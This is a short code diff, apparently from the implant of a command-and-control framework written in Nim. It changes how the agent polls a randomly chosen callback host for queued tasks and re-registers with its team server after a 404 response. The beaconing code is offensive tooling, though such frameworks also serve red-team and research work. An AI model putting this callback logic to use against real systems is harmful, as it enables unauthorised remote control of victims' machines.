@@ -51,10 +51,15 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
         # Select random callback host
         let hosts = ctx.hosts.split(";")
         let host = hosts[rand(hosts.len() - 1)]
-        let responseBody = waitFor client.getContent(fmt"http://{host}/{endpoint[0..^2]}")
-    
+        let response = waitFor client.get(fmt"http://{host}/{endpoint[0..^2]}")
+
+        # Check the HTTP status code to determine whether the agent needs to re-register to the team server
+        if response.code == Http404: 
+            ctx.registered = false
+
         # Return if no tasks are queued
-        if responseBody.len <= 0: 
+        let responseBody = waitFor response.body
+        if responseBody.len() <= 0: 
             return ""
 
         # In case that tasks are found, apply data transformation to server's response body to get thr raw data
